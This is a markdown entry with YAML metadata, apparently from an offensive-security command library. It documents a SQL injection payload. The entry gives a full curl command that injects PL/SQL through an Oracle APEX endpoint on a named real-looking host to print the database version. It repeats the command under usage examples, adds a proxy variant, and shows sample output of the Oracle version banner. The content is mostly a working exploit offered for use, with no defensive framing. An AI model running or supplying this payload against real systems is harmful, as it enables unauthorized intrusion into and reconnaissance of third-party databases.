---
data: >-
  curl
  "http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version"
  -d ":1=SELECT banner FROM v$version" -v
tags:
  - sqli
  - exploitation
  - oracle
type: command
output: >-
  Oracle Database 11g Release 11.2.0.3.0 - 64bit Production PL/SQL Release
  11.2.0.3.0 - Production CORE 11.2.0.3.0 Production TNS for Linux: Version
  11.2.0.3.0 - Production NLSRTL Version 11.2.0.3.0 - Production
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:25.729Z'
id: 7e539008-0200-47d1-afc8-fae901285de3
verified: false
validated: true
submitted: true
---
# extract-db-version-payload

## Command

```bash
curl "http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version" -d ":1=SELECT banner FROM v$version" -v
```

## Description

Exploits SQLi to run PL/SQL that selects and prints the database version using OWA_UTIL.CELLSPRINT.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Endpoint with PL/SQL payload | Yes |
| -d | POST data for :1 parameter | Yes |
| -v | Verbose output | No |

## Examples

### Basic Usage

```bash
curl "http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version" -d ":1=SELECT banner FROM v$version" -v
```

### Advanced Usage

```bash
curl -x http://proxy:8080 "http://ipm.informatica.com/pls/apex/f?..." -d ":1=..." -v
```

## Expected Output

Database version banner printed in the response body.

## Related

- [[commands/extract-usernames-payload]]
- [[procedures/Extract-Database-Version-via-SQL-Injection]]
